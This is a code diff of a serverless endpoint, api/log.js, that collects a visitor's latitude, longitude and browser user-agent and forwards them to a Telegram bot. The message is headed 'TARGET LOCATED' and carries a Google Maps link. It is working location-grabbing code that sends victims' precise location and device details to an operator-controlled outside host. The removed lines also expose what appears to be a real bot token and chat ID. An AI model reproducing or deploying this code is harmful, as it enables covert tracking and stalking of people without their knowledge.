@@ -1,17 +1,25 @@
+// api/log.js
 export default async function handler(req, res) {
   if (req.method === 'POST') {
     try {
       const { lat, lon } = JSON.parse(req.body);
-      const token = '8999786868:AAE-U4z0bEc7U9URlYUCGTrqs5c5g-jRVFw'; 
-      const chatId = '8995886457';
       
-      const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      // Captures browser and device metadata
+      const userAgent = req.headers['user-agent'] || 'Unknown Device';
+      
+      const token = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your token
+      const chatId = 'YOUR_CHAT_ID';           // Replace with your ID
+      
+      // Formatting the message for Telegram
+      const msg = `📍 TARGET LOCATED\n` +
+                  `Coordinates: ${lat}, ${lon}\n` +
+                  `Device: ${userAgent}\n` +
+                  `Maps Link: https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+    
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          chat_id: chatId, 
-          text: `📍 TARGET LOCATED\nLat: ${lat}\nLon: ${lon}\nMaps: https://www.google.com/maps?q=${lat},${lon}` 
-        })
+        body: JSON.stringify({ chat_id: chatId, text: msg })
       });
       
       res.status(200).json({ status: 'success' });
@@ -19,8 +27,6 @@ export default async function handler(req, res) {
       res.status(500).json({ status: 'error', message: error.message });
     }
   } else {
-    res.status(405).json({ status: 'method not allowed' });
+    res.status(405).json({ status: 'Method not allowed' });
   }
 }
-
-        
